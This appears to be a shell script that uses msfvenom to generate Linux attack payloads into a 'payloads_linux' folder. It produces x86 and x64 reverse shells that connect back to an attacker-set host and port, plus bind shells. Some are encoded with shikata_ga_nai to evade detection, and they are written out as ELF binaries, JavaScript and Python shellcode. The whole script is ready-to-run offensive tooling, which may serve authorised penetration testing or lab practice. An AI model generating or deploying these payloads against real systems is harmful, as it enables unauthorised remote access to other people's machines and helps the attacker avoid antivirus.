mkdir payloads_linux
cd payloads_linux

  # Reverse shells
  msfvenom -p linux/x86/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f elf -a x86 --platform linux -o shell_reverse_tcp_x86.elf
  msfvenom -p linux/x64/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f elf -a x64 --platform linux -o shell_reverse_tcp_x64.elf

  msfvenom -p linux/x86/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f elf -a x86 --platform linux -e x86/shikata_ga_nai -o shell_reverse_tcp_x86_shikata_ga_nai.elf
  msfvenom -p linux/x64/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f elf -a x64 --platform linux -e x86/shikata_ga_nai -o shell_reverse_tcp_x64_shikata_ga_nai.elf

  msfvenom -p linux/x86/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f js_le -a x86 --platform linux -e x86/shikata_ga_nai -o shell_reverse_tcp_x86_shikata_ga_nai.js_le
  msfvenom -p linux/x64/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f js_le -a x64 --platform linux -e x86/shikata_ga_nai -o shell_reverse_tcp_x64_shikata_ga_nai.js_le

  msfvenom -p linux/x86/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f python -a x86 --platform linux -e x86/shikata_ga_nai -o shell_reverse_tcp_x86_shikata_ga_nai.python
  msfvenom -p linux/x64/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f python -a x64 --platform linux -e x86/shikata_ga_nai -o shell_reverse_tcp_x64_shikata_ga_nai.python

  # Bind shells
  msfvenom -p linux/x86/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f elf -a x86 --platform linux -o shell_bind_tcp_x86.elf
  msfvenom -p linux/x64/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f elf -a x64 --platform linux -o shell_bind_tcp_x64.elf

  msfvenom -p linux/x86/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f elf -a x86 --platform linux -e x86/shikata_ga_nai -o shell_bind_tcp_x86_shikata_ga_nai.elf
  msfvenom -p linux/x64/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f elf -a x64 --platform linux -e x86/shikata_ga_nai -o shell_bind_tcp_x64_shikata_ga_nai.elf

  msfvenom -p linux/x86/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f js_le -a x86 --platform linux -e x86/shikata_ga_nai -o shell_bind_tcp_x86_shikata_ga_nai.js_le
  msfvenom -p linux/x64/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f js_le -a x64 --platform linux -e x86/shikata_ga_nai -o shell_bind_tcp_x64_shikata_ga_nai.js_le

  msfvenom -p linux/x86/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f python -a x86 --platform linux -e x86/shikata_ga_nai -o shell_bind_tcp_x86_shikata_ga_nai.python
  msfvenom -p linux/x64/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f python -a x64 --platform linux -e x86/shikata_ga_nai -o shell_bind_tcp_x64_shikata_ga_nai.python

  # Create all common shells in payloads_linux folder
  bash ../_setup/setup_payloads.sh
cd -
